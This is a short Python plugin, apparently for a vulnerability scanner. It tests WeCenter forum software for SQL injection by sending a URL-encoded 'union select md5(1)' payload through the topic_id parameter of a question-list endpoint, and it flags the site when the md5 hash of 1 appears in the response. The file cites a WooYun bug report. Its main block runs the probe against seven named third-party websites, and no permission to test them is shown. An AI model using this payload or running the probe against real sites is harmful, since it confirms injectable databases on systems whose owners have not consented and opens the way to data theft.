#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 奶权
#_PlugName_ = wecenter sql注入
#__Refer___ = http://www.wooyun.org/bugs/wooyun-2010-0106369
import re
def assign(service, arg):
    if service == 'wecenter':
        return True, arg
def audit(arg):
    payload = 'explore/UPLOAD/?/topic/ajax/question_list/type-best&topic_id=1%29%20union%20select%20md5(1)%23'
    target = arg + payload
    
    code, head, res, errcode, _ = curl.curl2(target);
    if code == 200 and "c4ca4238a0b923820dcc509a6f75849b" in res:
        security_hole(target)
if __name__ == '__main__':
    from dummy import *
    audit(assign('wecenter', 'http://dajia.zydp.org/')[1])
    audit(assign('wecenter', 'http://utcn.org/')[1])
    audit(assign('wecenter', 'http://www.tkyouxi.com/')[1])
    audit(assign('wecenter', 'http://bbs.douapp.com/')[1])
    audit(assign('wecenter', 'http://baocai.us/')[1])
    audit(assign('wecenter', 'http://www.cniso.net/')[1])
    audit(assign('wecenter', 'https://phpsoho.com/')[1])